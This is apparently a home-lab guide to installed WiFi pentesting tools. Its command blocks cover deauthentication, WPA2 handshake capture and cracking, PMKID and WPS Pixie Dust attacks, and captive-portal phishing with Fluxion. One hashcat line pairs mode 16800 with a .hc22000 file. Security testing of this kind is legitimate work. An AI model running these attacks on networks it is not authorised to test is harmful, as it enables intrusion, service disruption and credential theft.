# WiFi Pentesting Tools Guide

## Overview

This guide covers all WiFi pentesting tools installed in the home lab.

## Quick Start

```bash
# Start WiFi menu
go wifi-menu

# Or run specific tool
sudo wifyte
```

## Installed Tools

### 1. Aircrack-ng Suite

The core WiFi cracking suite.

```bash
# Enable monitor mode
airmon-ng start wlan0

# Scan networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth attack
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack password
aircrack-ng -w wordlist.txt capture-01.cap
```

### 2. Wifyte

Modern WPA handshake capture tool with rich UI.

```bash
# Run
sudo wifyte

# Features:
# - Automated handshake capture
# - Vendor lookup
# - Hidden SSID detection
```

### 3. WiFiSentry

Lightweight wireless pentesting tool.

```bash
# Run
sudo wifi-sentry

# Features:
# - Rogue AP detection
# - Handshake capture
# - Deauth attacks
# - Real-time monitoring
```

### 4. Fluxion

MITM WPA attacks with captive portal.

```bash
# Run
sudo fluxion

# Features:
# - Fake AP creation
# - Captive portal phishing
# - Handshake verification
```

### 5. RX-WiFi Pro

AI-powered WiFi security testing.

```bash
# Run
sudo rx-wifi

# Features:
# - WPA2/PMKID/WPS attacks
# - Parallel operations
# - Stealth mode
```

### 6. Wraithnet

Multi-tool WiFi pentesting.

```bash
# Run
cd /opt/wifi-tools/wraithnet
sudo python3 wraithnet.py
```

### 7. Wifite2

Automated wireless attacks.

```bash
# Run
sudo wifite
```

## WiFi Menu

```bash
# Launch menu
wifi-menu

# Options:
# 1. WiFiSentry   - Rogue AP detection
# 2. Wifyte       - Handshake capture
# 3. WiFiStrike   - Deauthentication
# 4. Fluxion      - WPA phishing
# 5. RX-WiFi Pro  - AI WiFi testing
# 6. Wraithnet    - Multi-tool
# 7. HackWiFi    - Automated toolkit
# 8. Wifite      - Classic automated
# 9. Aircrack-ng - Core suite
# 10. Hashcat    - GPU cracking
```

## Common Attacks

### WPA2 Handshake Capture

```bash
# 1. Enable monitor mode
airmon-ng start wlan0

# 2. Scan for networks
airodump-ng wlan0mon

# 3. Capture on target channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# 4. Deauth client
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack
aircrack-ng -w rockyou.txt handshake-01.cap
```

### PMKID Attack

```bash
# 1. Get PMKID
airmon-ng start wlan0
airodump-ng wlan0mon

# 2. Use hashcat
hashcat -m 16800 pmkid.hc22000 wordlist.txt
```

### WPS Pixie Dust

```bash
wash -i wlan0mon

reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1
```

## Wordlists

| Wordlist | Location | Use |
|----------|----------|-----|
| rockyou.txt | /usr/share/wordlists/ | Default |
| darkc0de.txt | /usr/share/wordlists/ | Large |
| Seclists | /usr/share/seclists/ | Comprehensive |

## Hardware Requirements

### Supported Adapters

| Adapter | Chipset | Status |
|---------|---------|--------|
| TP-Link TL-WN722N | Atheros AR9271 | ✓ Recommended |
| Alfa AWUS036NHA | Atheros AR9271 | ✓ Best |
| Alfa AWUS036ACH | Realtek 8812AU | ✓ |
| Panda PAU09 | Realtek 8814AU | ✓ |

### Monitor Mode

Some adapters don't support monitor mode in Windows. Use Kali Linux for full functionality.

## Troubleshooting

### No Interface Found
```bash
# Check wireless interfaces
iwconfig
ip link show

# Load driver
modprobe ath9k_htc
```

### Device Busy
```bash
# Kill interfering processes
airmon-ng check kill

# Or
pkill -9 NetworkManager
```

### Injection Not Working
```bash
# Test injection
aireplay-ng --test wlan0mon

# Check driver
lsusb
dmesg | grep -i wifi
```

## Legal

⚠️ **Only test networks you own or have authorization to test.**

---

*Updated: 2026-03-26*
